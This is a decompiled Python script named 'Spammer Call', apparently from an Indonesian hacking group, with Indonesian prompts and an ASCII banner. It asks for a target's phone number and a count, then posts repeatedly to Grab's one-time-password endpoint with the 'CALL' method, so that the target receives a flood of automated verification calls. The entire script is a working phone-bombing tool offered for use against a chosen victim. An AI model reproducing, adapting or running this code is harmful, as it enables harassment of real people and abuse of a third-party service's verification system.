# uncompyle6 version 3.3.5
# Python bytecode 3.7 (3394)
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:05:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: call.py
# Size of source mod 2**32: 3558 bytes
import time, itertools, threading, sys, os, requests, random
lr = '\x1b[91m'
lg = '\x1b[92m'
y = '\x1b[93m'
lb = '\x1b[94m'
cy = '\x1b[36m'
x = '\x1b[0m'

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)


bann = '\n\x1b[92m  _  _  _  _  _  _  _\n\x1b[92m / \\/ \\/ \\/ \\/ \\/ \\/ \\ \n\x1b[92m( \x1b[36mS  P  A  M  M  E  R \x1b[92m)   \x1b[1;31m[ \x1b[94mSpammer Call \x1b[1;31m]\n\x1b[92m \\_/\\_/\\_/\\_/\\_/\\_/\\_/ \x1b[36m Author \x1b[1;31m: \x1b[93m404rgr\n\x1b[92m / \\   / \\   / \\   / \\  \x1b[36mVersion\x1b[1;31m: \x1b[93m1.0 {Unfaedah}\n\x1b[92m( \x1b[36mC\x1b[92m ) ( \x1b[36mA \x1b[92m) (\x1b[36m L\x1b[92m ) ( \x1b[36mL\x1b[92m )\x1b[36m Team  \x1b[1;31m : \x1b[93mRao Cyber Team\n\x1b[92m \\_/   \\_/   \\_/   \\_/\n'

def check_internet():
    url = 'http://google.com'
    timeout = 5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        print('[Upss...] Sambungan terputus')
        time.sleep(1)
        print('Priksa Kembali Sambungan Internet Anda :v')
        exit()

    return False


r = '\x1b[1;31m'
g = '\x1b[1;32m'
w = '\x1b[1;37m'
os.system('clear')
print(bann)
mengetik(r + ' !' + lb + " Masukan Nomor dengan '62' {ex: 6289532xxxx}")
koo = input(y + '[' + r + '#' + y + '] No Hp Target @=> ' + lg)
total = int(input(r + u'%s[\xd7] Jumlah $=> %s' % (g, w)))
time.sleep(1)
check_internet()
print(y + ' {Tekan Ctrl + C untuk keluar dari program} ' + r)
time.sleep(1)

def updt(total, progress):
    barLength, status = (20, '')
    progress = float(progress) / float(total)
    if progress >= 1.0:
        progress, status = (1, '\r\n')
    block = int(round(barLength * progress))
    text = '\rLoading. [ {} ] {:.0f}% {}'.format('#' * block + '-' * (barLength - block), round(progress * 100, 0), status)
    sys.stdout.write(text)
    sys.stdout.flush()


runs = 100
for run_num in range(runs):
    time.sleep(0.001)
    updt(runs, run_num + 1)

met = {'method':'CALL', 
 'countryCode':'id',  'phoneNumber':koo,  'templateID':'pax_android_production'}
try:
    os.system('clear')
    print(bann)
    time.sleep(0.1)
    time.sleep(0.1)
    print(y + ' <' + r + '+' + y + '>' + lg + ' No Target =' + r + '>', koo)
    time.sleep(0.1)
    print(y + ' <' + r + '-' + y + '>' + lg + ' Jumlah Yang Akan Di Kirim =' + r + '>', total)
    time.sleep(3)
    print()
    print(r + '[>_ ]' + lg + ' Start')
    for i in range(total):
        idk = 'challengeID'
        MEM = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=met)
        if str(idk) in str(MEM.text):
            print('[+] BERHASIL TERKIRIM [+]')
        else:
            print('[-] GAGAL MENGIRIM [-]')
        time.sleep(37)

except KeyboardInterrupt:
    print()
    print(y + 'Good By Wahai Manuksia :(')
    print(r + 'Aku Sayang Kamu')
    time.sleep(3)
    print(cy + 'Haha Gila')
    time.sleep(2)
    print(y + 'Lah Emang Iya :v')
    time.sleep(1)
    print(r + "bye :')")
    exit()